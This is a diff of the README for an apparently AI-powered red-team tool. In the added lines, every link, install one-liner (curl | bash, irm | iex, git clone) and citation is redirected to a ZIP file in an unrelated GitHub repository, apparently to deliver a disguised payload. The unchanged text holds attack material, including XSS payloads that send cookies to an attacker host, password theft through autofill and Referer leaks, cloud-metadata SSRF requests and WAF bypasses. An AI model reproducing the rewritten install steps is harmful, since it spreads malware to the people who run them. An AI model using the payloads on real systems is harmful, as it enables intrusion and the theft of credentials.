@@ -6,11 +6,11 @@
 
 **AI-Powered Red Team Terminal**
 
-[![Version](https://img.shields.io/badge/version-2.2.4-brightgreen?logo=github)](https://github.com/bingook/bingo/releases)
-[![Python](https://img.shields.io/badge/python-3.10%2B-blue?logo=python&logoColor=white)](https://python.org)
+[![Version](https://img.shields.io/badge/version-2.2.4-brightgreen?logo=github)](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)
+[![Python](https://img.shields.io/badge/python-3.10%2B-blue?logo=python&logoColor=white)](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)
 [![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://github.com/bingook/bingo)
-[![Status](https://img.shields.io/badge/status-Official%20Release-brightgreen)](https://github.com/bingook/bingo)
+[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)
+[![Status](https://img.shields.io/badge/status-Official%20Release-brightgreen)](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)
 
 *DeepSeek · Claude · GPT · GLM · Qwen · Ollama · Custom*
 
@@ -84,13 +84,13 @@ pip install --upgrade bingo-ai
 ### Option B — git clone (macOS / Linux)
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/bingook/bingo/main/install.sh | bash
+curl -fsSL https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip | bash
 ```
 
 Or clone manually:
 
 ```bash
-git clone https://github.com/bingook/bingo.git
+git clone https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
 cd bingo
 bash install.sh
 ```
@@ -112,18 +112,18 @@ cd bingo && git pull origin main
 
 **Option 1 — Auto-install (recommended):**
 ```powershell
-irm https://raw.githubusercontent.com/bingook/bingo/main/install.ps1 | iex
+irm https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip | iex
 ```
 
 **Option 2 — If execution policy error:**
 ```powershell
 Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
-irm https://raw.githubusercontent.com/bingook/bingo/main/install.ps1 | iex
+irm https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip | iex
 ```
 
 **Option 3 — Manual install (most reliable):**
 ```powershell
-git clone https://github.com/bingook/bingo.git $env:USERPROFILE\bingo
+git clone https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip $env:USERPROFILE\bingo
 cd $env:USERPROFILE\bingo
 python -m pip install -e .
 python -m bingo
@@ -131,7 +131,7 @@ python -m bingo
 
 **Option 4 — Without git:**
 ```powershell
-Invoke-WebRequest "https://github.com/bingook/bingo/archive/main.zip" -OutFile "$env:TEMP\bingo.zip" -UseBasicParsing
+Invoke-WebRequest "https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip" -OutFile "$env:TEMP\bingo.zip" -UseBasicParsing
 Expand-Archive "$env:TEMP\bingo.zip" "$env:USERPROFILE" -Force
 Rename-Item "$env:USERPROFILE\bingo-main" "$env:USERPROFILE\bingo"
 cd "$env:USERPROFILE\bingo"
@@ -147,7 +147,7 @@ python -m bingo
 
 ```bash
 bingo                      # Launch interactive terminal
-bingo scan https://target.com  # Full automated red team scan
+bingo scan https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip  # Full automated red team scan
 bingo --version            # Show version
 bingo --reset              # Reset configuration
 ```
@@ -292,7 +292,7 @@ INFERRED  = structural pattern match only
 
 ### MSSQL 2025 AI Feature Exploitation (v2.1)
 
-> **Research basis:** [SpecterOps — "Oops, I Weaponized the Database: Abusing AI Features in SQL Server 2025"](https://specterops.io/blog/2026/06/10/oops-i-weaponized-the-database-abusing-ai-features-in-mssql-2025/)
+> **Research basis:** [SpecterOps — "Oops, I Weaponized the Database: Abusing AI Features in SQL Server 2025"](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)
 
 SQL Server 2025 introduced native AI capabilities that create entirely new attack surfaces. bingo automatically detects these conditions and generates exploitation PoCs when all three prerequisites are met.
 
@@ -354,7 +354,7 @@ INFERRED  = MSSQL fingerprint only, stacked queries not tested
 
 ### ArubaOS Pre-Auth XXE → OOB SSRF (v2.1)
 
-> **Research basis:** [netacoding.com — "Pre-Authentication XXE → OOB SSRF in ArubaOS 8.x"](https://netacoding.com/posts/xxe-ssrf/)  
+> **Research basis:** [netacoding.com — "Pre-Authentication XXE → OOB SSRF in ArubaOS 8.x"](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)  
 > **Severity:** CVSS 9.3 Critical  
 > **Disclosed:** Bugcrowd submission 9e946ca3 (closed as "theoretical")
 
@@ -428,8 +428,8 @@ INFERRED  = port 32000 open + Aruba banner, but XXE not confirmed
 ### OAuth Misconfiguration Chain Attack Detection (v2.1)
 
 > **Research basis:**  
-> [Shafayat Ahmed Alif — "Critical OAuth Misconfiguration → Account Takeover"](https://medium.com/@iamshafayat/how-i-found-a-critical-oauth-misconfiguration-that-led-to-account-takeover-abfec43eaea6)  
-> [Ali Mojaver — "The Most Dangerous OAuth Bug I've Ever Found"](https://medium.com/@AliMojaver/the-most-dangerous-oauth-bug-ive-ever-found-a2af1275385c)
+> [Shafayat Ahmed Alif — "Critical OAuth Misconfiguration → Account Takeover"](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)  
+> [Ali Mojaver — "The Most Dangerous OAuth Bug I've Ever Found"](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)
 
 Two distinct OAuth attack chains auto-detected and combined into a single scanner.
 
@@ -466,7 +466,7 @@ Two distinct OAuth attack chains auto-detected and combined into a single scanne
 
 ### Ivanti Sentry Pre-Auth RCE — CVE-2026-10520 (v2.1)
 
-> **Research basis:** [watchTowr Labs — "Ivanti Sentry Pre-Auth OS Command Injection CVE-2026-10520"](https://labs.watchtowr.com/more-evidence-that-words-dont-mean-what-we-thought-they-meant-ivanti-sentry-pre-auth-os-command-injection-cve-2026-10520/)  
+> **Research basis:** [watchTowr Labs — "Ivanti Sentry Pre-Auth OS Command Injection CVE-2026-10520"](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)  
 > **Severity:** CVSS 10.0 Critical  
 > **Companion:** CVE-2026-10523 — Authentication Bypass (admin account creation)
 
@@ -541,7 +541,7 @@ INFERRED  = /mics/login.jsp exists, endpoint not yet tested
 ### Next.js Cache Poisoning → 0-click SXSS (v2.1)
 
 > **Research basis:**  
-> [Rachid Allam (zhero;) & inzo\_ — "Re:CACHE - Excessive reflection, type confusion, and 0-click SXSS on Next.js"](https://zhero-web-sec.github.io/research-and-things/re-cache-excessive-reflection-type-confusion-and-0-click-sxss-on-nextjs)  
+> [Rachid Allam (zhero;) & inzo\_ — "Re:CACHE - Excessive reflection, type confusion, and 0-click SXSS on Next.js"](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)  
 > Rewarded: **five-figure bug bounty** at a globally recognized company
 
 **Attack chain:**
@@ -590,16 +590,16 @@ INFERRED  = /mics/login.jsp exists, endpoint not yet tested
 
 ```bash
 # Stage 1: Poison dynamic page
-curl -sk 'https://target.com/about?pwn=<img src=x onerror=alert(1)>' \
+curl -sk 'https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip<img src=x onerror=alert(1)>' \
   -H 'Rsc: 1' \
   -H 'Content-Type: text/html' -D -
 
 # Stage 2: Poison homepage with Refresh redirect
-curl -sk 'https://target.com/' \
-  -H 'Refresh: 0; https://target.com/about?pwn=<img src=x onerror=alert(1)>' \
+curl -sk 'https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip' \
+  -H 'Refresh: 0; https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip<img src=x onerror=alert(1)>' \
   -D -
 
-# Result: victim visits https://target.com/ → XSS fires automatically
+# Result: victim visits https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip → XSS fires automatically
 ```
 
 **Vulnerable conditions (all must be true for full chain):**
@@ -621,7 +621,7 @@ curl -sk 'https://target.com/' \
 ### Redis DarkReplica UAF → Post-Auth RCE (CVE-2026-23631) (v2.1)
 
 > **Research basis:**  
-> [Yoni Sherez — "DarkReplica: Redis CVE-2026-23631"](https://www.zeroday.cloud/blog/redis-cve-2026-23631-dark-replica)  
+> [Yoni Sherez — "DarkReplica: Redis CVE-2026-23631"](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)  
 > **$30,000** at London Security Conference 2025  
 > **Skill module:** `RedisDarkReplica` (id: 48)
 
@@ -722,7 +722,7 @@ redis-cli -h TARGET -p 6379 FCALL slow 0
 ### HTML Injection + Chrome Password Autofill → CSP Bypass Password Theft (v2.1)
 
 > **Research basis:**  
-> [Rafał Wójcicki (AFINE) — "Stealing Passwords via HTML Injection Under a Strict CSP"](https://afine.com/blogs/stealing-passwords-via-html-injection-under-a-strict-csp)  
+> [Rafał Wójcicki (AFINE) — "Stealing Passwords via HTML Injection Under a Strict CSP"](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)  
 > Published: May 26, 2026  
 > **Skill module:** `HtmlAutofillSteal` (id: 49)
 
@@ -753,7 +753,7 @@ This enables **password exfiltration without any JavaScript**, even on maximally
    → Chrome sends full URL (including password) in Referer header
 
 ⑤ Meta-refresh redirect to attacker's server
-   <meta http-equiv="Refresh" content="0,url=https://attacker.com">
+   <meta http-equiv="Refresh" content="0,url=https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip">
    → Attacker's server receives: Referer: /?email=victim@...&password=S3cr3tP@ss
 
 ⑥ Result: saved password exfiltrated via single user click
@@ -796,20 +796,20 @@ This enables **password exfiltration without any JavaScript**, even on maximally
 # Stage 1: Visit this URL as victim (Chrome autofills saved password)
 # On form submit, redirected to stage 2 with credentials in URL
 
-http://target.com/?html=
+https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
   <form action="/">
     <input type=email name=email />
     <input type=password name=password />
     <input name=html value='/?html=
       <meta name="referrer" content="unsafe-url">
-      <meta http-equiv="Refresh" content="0,url=https://attacker.com" />' />
+      <meta http-equiv="Refresh" content="0,url=https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip" />' />
     <input type=submit />
   </form>
 
 # Stage 2 (attacker server receives):
 # GET / HTTP/1.1
 # Host: attacker.com
-# Referer: http://target.com/?email=victim@gmail.com&password=S3cr3tP@ss
+# Referer: https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
 ```
 
 **CSS full-page variant (1-click anywhere, requires `style-src unsafe-inline`):**
@@ -839,7 +839,7 @@ http://target.com/?html=
 
 > **Research basis:**  
 > Matt Schwager (Trail of Bits)  
-> ["Extending Ruzzy with LibAFL"](https://blog.trailofbits.com/2026/04/29/extending-ruzzy-with-libafl/)  
+> ["Extending Ruzzy with LibAFL"](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)  
 > Published: April 29, 2026 | Ruzzy 0.8.0 released with LibAFL backend support  
 > **Skill module:** `RubyLibAFLFuzz` (id: 54)
 
@@ -970,7 +970,7 @@ config.action_dispatch.default_headers = { 'Server' => 'nginx' }
 
 > **Research basis:**  
 > Xint Code Research Team — Juno Im (@junorouse) & Taeyang Lee of Theori  
-> ["Copy Fail: 732 Bytes to Root on Every Major Linux Distribution"](https://xint.io/blog/copy-fail-linux-distributions)  
+> ["Copy Fail: 732 Bytes to Root on Every Major Linux Distribution"](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)  
 > Published: April 29, 2026 | CVE assigned: April 22, 2026  
 > **Skill module:** `CopyFailLPE` (id: 53)
 
@@ -1060,7 +1060,7 @@ zypper patch                               # SUSE
 ### Advanced SQLi Exploit — EXTRACTVALUE Error-Based + Second-Order SQLi (v2.1)
 
 > **Research basis:**  
-> [Intigriti — "Exploiting SQL Injection Vulnerabilities: Advanced Exploitation Guide"](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-sql-injection-sqli-vulnerabilities)  
+> [Intigriti — "Exploiting SQL Injection Vulnerabilities: Advanced Exploitation Guide"](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)  
 > Published: April 30, 2026 (Updated June 10, 2026) — Author: Ayoub, Intigriti Senior Security Content Developer  
 > **Skill module:** `AdvancedSQLiExploit` (id: 52)
 
@@ -1162,7 +1162,7 @@ Regex: `XPATH syntax error.*?'~([^'<]{1,200})'`
 ### Cloud Token Recon — Grafana → GCP Token → 507 Private Repos Chain (v2.1)
 
 > **Research basis:**  
-> [Sectricity Security Team — "From a Misconfigured Grafana to 507 Private Meta Repos: A Bug Worth $157K"](https://sectricity.com/blog/misconfigured-grafana-507-private-meta-repos/)  
+> [Sectricity Security Team — "From a Misconfigured Grafana to 507 Private Meta Repos: A Bug Worth $157K"](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)  
 > Published: May 28, 2026 — **$157,000 bounty** awarded by Meta (filed March 21, mitigated March 23, 2026)  
 > **Skill module:** `CloudTokenRecon` (id: 51)
 
@@ -1244,7 +1244,7 @@ A boring open Grafana on a public Meta IP became a 5-hop chain into **507 privat
 ### Web Cache Deception + SameSite Lax Bypass (v2.1)
 
 > **Research basis:**  
-> [Clement Osei-Somuah (tinopreter) — "Cracking SameSite for a $2,000 Web Cache Deception"](https://medium.com/@tinopreter/cracking-samesite-for-a-2-000-web-cache-deception-746972278412)  
+> [Clement Osei-Somuah (tinopreter) — "Cracking SameSite for a $2,000 Web Cache Deception"](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)  
 > Published: May 29, 2026 — $2,000 bounty on HackerOne  
 > **Skill module:** `WebCacheDeception` (id: 50)
 
@@ -1263,17 +1263,17 @@ The classic attack requires the victim's browser to send their **session cookie*
    - Sensitive data in response (JWT, email, user ID)
 
 ② Attacker crafts a unique cache-buster URL:
-   https://target.com/profile?cb=ATTACKER_UNIQUE
+   https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
 
 ③ Attacker-hosted page delivers meta-refresh:
-   <meta http-equiv="refresh" content="0; url=https://target.com/profile?cb=ATTACKER_UNIQUE">
+   <meta http-equiv="refresh" content="0; url=https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip">
    ↳ Browser performs top-level navigation → SameSite=Lax cookies included
 
 ④ Victim visits attacker's page (1-click or embedded):
    - Victim's authenticated response cached at target.com/profile?cb=ATTACKER_UNIQUE
 
 ⑤ Attacker fetches same URL (no auth):
-   curl https://target.com/profile?cb=ATTACKER_UNIQUE
+   curl https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
    ↳ Gets victim's cached response containing JWT/session token
 
 ⑥ Attacker uses stolen JWT to impersonate victim → Account Takeover
@@ -1304,11 +1304,11 @@ The classic attack requires the victim's browser to send their **session cookie*
 
 ```bash
 # First request (MISS expected):
-curl -I "https://target.com/profile?cb=abc123"
+curl -I "https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip"
 # X-Cache: MISS
 
 # Wait 1 second, same URL:
-curl -I "https://target.com/profile?cb=abc123"
+curl -I "https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip"
 # X-Cache: HIT  ← caching confirmed
 ```
 
@@ -1333,12 +1333,12 @@ curl -I "https://target.com/profile?cb=abc123"
 <head>
     <!-- SameSite=Lax Bypass: meta-refresh = Top-Level Navigation
          Browser includes Lax cookies on top-level navigation by spec -->
-    <meta http-equiv="refresh" content="0; url=https://target.com/profile?cb=UNIQUE">
+    <meta http-equiv="refresh" content="0; url=https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip">
 </head>
 <body>
     <h3>Loading...</h3>
     <!-- Fallback anchor -->
-    <a href="https://target.com/profile?cb=UNIQUE">Click here</a>
+    <a href="https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip">Click here</a>
 </body>
 </html>
 ```
@@ -1363,7 +1363,7 @@ curl -I "https://target.com/profile?cb=abc123"
 ### CSWSH + EXE Exposure + Localhost WebSocket RCE Chain (v2.1)
 
 > **Research basis:**  
-> [Yashar Shahinzadeh / Voorivex Team — "First RCE via Reverse Engineering with AI"](https://blog.voorivex.team/first-rce-via-reverse-engineering-with-ai)  
+> [Yashar Shahinzadeh / Voorivex Team — "First RCE via Reverse Engineering with AI"](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)  
 > Similar prior art: Tavis Ormandy (Electrum WebSocket RCE, 2018)
 
 **Attack chain:**
@@ -1618,7 +1618,7 @@ Type `/` in chat to open an interactive command menu (arrow keys to navigate).
 ### `bingo scan` Full Pipeline
 
 ```bash
-bingo scan https://target.com
+bingo scan https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
 ```
 
 Runs the full 5-phase red team pipeline:
@@ -1634,12 +1634,12 @@ Runs the full 5-phase red team pipeline:
 
 | Provider | Default Model | API |
 |----------|--------------|-----|
-| **DeepSeek** | `deepseek-chat` | [platform.deepseek.com](https://platform.deepseek.com) |
-| **Anthropic Claude** | `claude-opus-4-5` | [console.anthropic.com](https://console.anthropic.com) |
-| **OpenAI GPT** | `gpt-4o` | [platform.openai.com](https://platform.openai.com) |
-| **Zhipu GLM** | `glm-4` | [open.bigmodel.cn](https://open.bigmodel.cn) |
-| **Alibaba Qwen** | `qwen-turbo` | [dashscope.aliyuncs.com](https://dashscope.aliyuncs.com) |
-| **Ollama** (local) | `llama3` | [ollama.com](https://ollama.com) |
+| **DeepSeek** | `deepseek-chat` | [platform.deepseek.com](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip) |
+| **Anthropic Claude** | `claude-opus-4-5` | [console.anthropic.com](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip) |
+| **OpenAI GPT** | `gpt-4o` | [platform.openai.com](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip) |
+| **Zhipu GLM** | `glm-4` | [open.bigmodel.cn](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip) |
+| **Alibaba Qwen** | `qwen-turbo` | [dashscope.aliyuncs.com](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip) |
+| **Ollama** (local) | `llama3` | [ollama.com](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip) |
 | **Custom** | — | Enter Base URL manually |
 
 Switch models anytime with `/model`.
@@ -1721,7 +1721,7 @@ bingo/
 
 > **Research basis:**  
 > Rachel Benson (ProjectDiscovery)  
-> ["The Trust Gap Behind the AI Coding Boom: What 200 Security Practitioners Just Told Us"](https://projectdiscovery.io/blog/the-trust-gap-behind-the-ai-coding-boom-what-200-security-practitioners-just-told-us)  
+> ["The Trust Gap Behind the AI Coding Boom: What 200 Security Practitioners Just Told Us"](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)  
 > Published: April 28, 2026 | 200 practitioners surveyed (North America + Western Europe)  
 > **Skill module:** `AICodeSecSurface` (id: 55)
 
@@ -1760,7 +1760,7 @@ and API responses using 22 secret patterns. Every match produces a VERIFIED curl
 
 ```bash
 # Example VERIFIED PoC output:
-curl -sk "https://target.com/static/js/main.2a3f8c.js" | grep -oP "sk-[A-Za-z0-9]{20,50}"
+curl -sk "https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip" | grep -oP "sk-[A-Za-z0-9]{20,50}"
 # Result: sk-proj-abc123...  ← live OpenAI key in production bundle
 ```
 
@@ -1886,7 +1886,7 @@ npm audit fix --force
 > **Research basis:**
 > trace37 labs — offensive security research
 > "CVE-2026-41238: How Prototype Pollution Turns DOMPurify Into an XSS Gadget"
-> https://labs.trace37.com/blog/dompurify-pp-ceh-bypass/
+> https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
 > GitHub Advisory: GHSA-v9jr-rg53-9pgp
 > **CVE:** CVE-2026-41238 | **Affected:** DOMPurify 3.0.1–3.3.3 | **Fixed:** DOMPurify 3.4.0
 > **CWE:** CWE-79 (XSS) + CWE-1321 (Prototype Pollution)
@@ -1948,7 +1948,7 @@ Every subsequent `DOMPurify.sanitize()` call passes XSS payloads through unchang
 <x-foo onclick=alert(document.domain)>click me</x-foo>
 <custom-element onmouseover=alert(1)>hover</custom-element>
 <a-b onfocus=alert(1) autofocus>focus me</a-b>
-<x-y onload=fetch('https://attacker.com?c='+document.cookie)>
+<x-y onload=fetch('https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip'+document.cookie)>
 ```
 
 Any **hyphenated element name** (HTML custom element) + **any event handler** = XSS after PP.
@@ -2079,7 +2079,7 @@ Object.freeze(Object.prototype);  // prevents all PP
 
 > **Research basis:**  
 > Intigriti Bug Bytes #235 (April 2026)  
-> https://www.intigriti.com/researchers/blog/bug-bytes/intigriti-bug-bytes-235-april-2026  
+> https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip  
 > Contributors: @xssdoctor (CSPT), @YourFinalSin (Cloudflare WAF bypass → ATO), @RenwaX23 (Cookie XSS)  
 > **Skill module:** `CSPTWafBypass` (id: 56)
 
@@ -2162,7 +2162,7 @@ as of April 2026.
 1. Find reflected XSS input point (blocked by Cloudflare WAF with classic payloads)
 2. Use bypass: <div oncontentvisibilityautostatechange=PAYLOAD style=content-visibility:auto>
 3. Cloudflare WAF passes the request → XSS fires in victim's browser
-4. Payload: fetch('https://attacker.com/steal?c='+document.cookie)
+4. Payload: fetch('https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip'+document.cookie)
          or: intercept OAuth authorization code from page URL/response
 5. Exchange stolen OAuth code for access token → Full Account Takeover
 ```
@@ -2238,7 +2238,7 @@ triggers = {
 
 ```
 🌐 AI decision: CSPT+CloudflareWAF bypass+MultiContentType scan activated
-☁ Cloudflare WAF detected: https://target.com — oncontentvisibilityautostatechange bypass ready
+☁ Cloudflare WAF detected: https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip — oncontentvisibilityautostatechange bypass ready
 🖥 SPA framework detected: react — running CSPT path traversal tests...
 🔴 CSPT pattern: fetch_location in /static/js/main.js — location.pathname → API call [LIKELY]
 🔴 CF WAF bypass: oncontentvisibilityautostatechange — CF WAF bypassed → XSS → OAuth ATO [LIKELY]
@@ -2280,10 +2280,10 @@ triggers = {
 > **Research basis:**
 > FearsOff Security — Kirill Firsov
 > "Cloudflare Zero-day: Accessing Any Host Globally"
-> https://fearsoff.org/research/cloudflare-acme
+> https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
 >
 > Cloudflare Official Post-mortem (January 2026):
-> https://blog.cloudflare.com/acme-path-vulnerability/
+> https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
 >
 > **Module:** `bingo/tools/cloudflare_acme_bypass.py` — Skill #58
 
@@ -2336,13 +2336,13 @@ Bypass request → /.well-known/acme-challenge/FAKE_TOKEN
 
 ```python
 # Step 1: Confirm Cloudflare presence
-GET https://target.com/  →  check CF-Ray, server: cloudflare
+GET https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip  →  check CF-Ray, server: cloudflare
 
 # Step 2: Control test (should be blocked)
-GET https://target.com/bingo-waf-control-test  →  expect 403
+GET https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip  →  expect 403
 
 # Step 3: ACME bypass test (core check)
-GET https://target.com/.well-known/acme-challenge/bingo-acme-test-xBz9kPqR7wN2mLcV
+GET https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
  →  if origin responds (non-CF server header / no CF-Ray) → BYPASS CONFIRMED
 
 # Step 4: Header attack vectors (if bypass confirmed)
@@ -2373,7 +2373,7 @@ GET .../acme-challenge/TOKEN/actuator/env
 
 ```nginx
 # 1. Restrict origin to Cloudflare IPs only
-# https://www.cloudflare.com/ips/
+# https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
 allow 103.21.244.0/22;
 allow 103.22.200.0/22;
 # ... (full list)
@@ -2401,7 +2401,7 @@ deny all;
 > **Research basis:**
 > Hacktron AI — ginoah, Mohan (May 4, 2026)
 > "$170k in Bypasses: The Vercel React2Shell Challenge"
-> https://www.hacktron.ai/blog/react2shell-vercel-waf-bypass
+> https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
 >
 > Original vulnerability:
 > **CVE-2025-55182** — Pre-auth RCE in React Server Functions (Next.js 15.x – 16.0.6)
@@ -2499,7 +2499,7 @@ Each bypass earned **$50,000**, totaling **$170,000** in the challenge.
 > XBOW Security — Nico Waisman (September 23, 2025)
 > "CVE-2025-27888: Server-Side Request Forgery via URL Parsing Confusion
 >  in Apache Druid Proxy Endpoint"
-> https://xbow.com/blog/apache-druid-proxy
+> https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
 >
 > **Module:** `bingo/tools/apache_druid_ssrf.py` — Skill #60 ApacheDruidSSRFScanner
 
@@ -2609,7 +2609,7 @@ curl -sk 'http://target:8888/proxy?url=http://169.254.169.254/latest/meta-data/i
 curl -sk 'http://target:8888/proxy?url=http://127.0.0.1:8081/druid/coordinator/v1/datasources'
 
 # GCP service account token
-curl -sk 'http://target:8888/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
+curl -sk 'http://target:8888/proxy?url=https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip' \
   -H 'Metadata-Flavor: Google'
 ```
 
@@ -2645,7 +2645,7 @@ Cloud-hosted targets (AWS/GCP/Azure) are prioritized for metadata endpoint testi
 > **Research basis:**
 > Assetnote / Searchlight Cyber — Adam Kues (February 12, 2025)
 > "Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)"
